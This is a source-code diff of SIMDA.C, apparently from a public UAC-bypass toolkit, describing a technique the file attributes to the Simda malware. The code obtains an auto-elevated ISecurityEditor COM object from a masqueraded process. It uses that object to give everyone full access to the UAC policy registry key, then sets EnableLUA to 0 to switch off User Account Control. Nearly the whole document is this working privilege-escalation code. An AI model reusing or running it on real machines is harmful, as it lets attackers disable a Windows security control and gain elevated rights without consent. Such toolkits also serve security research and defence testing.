@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2017
+*  (C) COPYRIGHT AUTHORS, 2015 - 2018
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     2.70
+*  VERSION:     3.11
 *
-*  DATE:        25 Mar 2017
+*  DATE:        23 Aug 2018
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -24,6 +24,7 @@
 * Purpose:
 *
 * Change object security through ISecurityEditor(SetNamedInfo).
+* This function expects that supMasqueradeProcess was called on process initialization.
 *
 */
 DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
@@ -33,73 +34,94 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
     _In_ LPWSTR NewSddl
 )
 {
-    HRESULT          r = E_FAIL;
+    HRESULT          r = E_FAIL, hr_init;
     BOOL             cond = FALSE;
-    IID              xIID_ISecurityEditor;
-    CLSID            xCLSID_ShellSecurityEditor;
-    ISecurityEditor *SecurityEditor1 = NULL;
+    ISecurityEditor *SecurityEditor = NULL;
+#ifdef _DEBUG
+    CLSID            xCLSID;
     LPOLESTR         pps;
+#endif
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
-        if (CLSIDFromString(
+#ifdef _DEBUG
+        r = CLSIDFromString(
             T_CLSID_ShellSecurityEditor,
-            &xCLSID_ShellSecurityEditor) != NOERROR) break;
+            &xCLSID);
 
-        if (IIDFromString(
-            T_IID_ISecurityEditor,
-            &xIID_ISecurityEditor) != S_OK) break;
+        if (r != NOERROR)
+            break;
 
-        r = CoCreateInstance(&xCLSID_ShellSecurityEditor, NULL,
+        r = CoCreateInstance(
+            &xCLSID,
+            NULL,
             CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
-            &xIID_ISecurityEditor, &SecurityEditor1);
+            &IID_ISecurityEditor,
+            &SecurityEditor);
 
         if (r != S_OK)
             break;
 
-        r = ucmMasqueradedCoGetObjectElevate(
+        if (SecurityEditor == NULL) {
+            r = E_OUTOFMEMORY;
+            break;
+        }
+
+        SecurityEditor->lpVtbl->Release(SecurityEditor);
+#endif
+
+        r = ucmAllocateElevatedObject(
             T_CLSID_ShellSecurityEditor,
+            &IID_ISecurityEditor,
             CLSCTX_LOCAL_SERVER,
-            &xIID_ISecurityEditor,
-            &SecurityEditor1);
+            &SecurityEditor);
 
         if (r != S_OK)
             break;
 
-        if (SecurityEditor1 == NULL) {
-            r = E_FAIL;
+        if (SecurityEditor == NULL) {
+            r = E_OUTOFMEMORY;
             break;
         }
 
-        pps = NULL;
-        r = SecurityEditor1->lpVtbl->GetSecurity(
-            SecurityEditor1,
-            lpTargetObject,
-            ObjectType,
-            SecurityInformation,
-            &pps
-        );
+#ifdef _DEBUG
+         pps = NULL;
+         r = SecurityEditor->lpVtbl->GetSecurity(
+             SecurityEditor,
+             lpTargetObject,
+             ObjectType,
+             SecurityInformation,
+             &pps
+         );
 
-        if ((r == S_OK) && (pps != NULL)) {
-            OutputDebugStringW(pps);
-        }
+         if ((r == S_OK) && (pps != NULL)) {
+             OutputDebugStringW(pps);
+         }
+#endif
 
-        r = SecurityEditor1->lpVtbl->SetSecurity(
-            SecurityEditor1,
+        r = SecurityEditor->lpVtbl->SetSecurity(
+            SecurityEditor,
             lpTargetObject,
             ObjectType,
             SecurityInformation,
             NewSddl
         );
 
+#ifdef _DEBUG
         if (r == S_OK) {
             OutputDebugStringW(NewSddl);
         }
+#endif
 
     } while (cond);
 
-    if (SecurityEditor1 != NULL) {
-        SecurityEditor1->lpVtbl->Release(SecurityEditor1);
+    if (SecurityEditor != NULL) {
+        SecurityEditor->lpVtbl->Release(SecurityEditor);
     }
+
+    if (hr_init == S_OK)
+        CoUninitialize();
 
     return SUCCEEDED(r);
 }
@@ -112,36 +134,37 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
 * Disable UAC using AutoElevated undocumented ISecurityEditor interface.
 * Used by WinNT/Simda starting from 2010 year.
 *
+* Fixed in Windows 10 TH1
+*
 */
 BOOL ucmSimdaTurnOffUac(
     VOID
 )
 {
-    BOOL                bResult = FALSE;
-    HKEY                hKey;
-    DWORD               dwValue;
-    WCHAR               szBuffer[MAX_PATH];
-    UNICODE_STRING      ustr;
-    OBJECT_ATTRIBUTES   obja;
+    BOOL               bResult = FALSE;
+    HANDLE             hKey = NULL;
+    DWORD              dwValue;
+    WCHAR              szBuffer[MAX_PATH];
+    UNICODE_STRING     ustr;
+    OBJECT_ATTRIBUTES  obja;
+    UNICODE_STRING     usEnableLua = RTL_CONSTANT_STRING(L"EnableLUA");
 
     bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
         DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);
 
     if (bResult) {
 
-        RtlSecureZeroMemory(&ustr, sizeof(ustr));
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, L"\\REGISTRY\\");
+        _strcpy(szBuffer, T_REGISTRY_PREP);
         _strcat(szBuffer, T_UACKEY);
         RtlInitUnicodeString(&ustr, szBuffer);
         InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
         if (NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja))) {
 
             dwValue = 0;
-            RtlInitUnicodeString(&ustr, L"EnableLUA");
             bResult = NT_SUCCESS(NtSetValueKey(
                 hKey,
-                &ustr,
+                &usEnableLua,
                 0,
                 REG_DWORD,
                 (PVOID)&dwValue,
@@ -149,6 +172,10 @@ BOOL ucmSimdaTurnOffUac(
 
             NtClose(hKey);
         }
+    }
+
+    if (bResult) {
+        ucmShowMessage(g_ctx->OutputToDebugger, L"UAC is now disabled.\nYou must reboot your computer for the changes to take effect.");
     }
 
     return bResult;
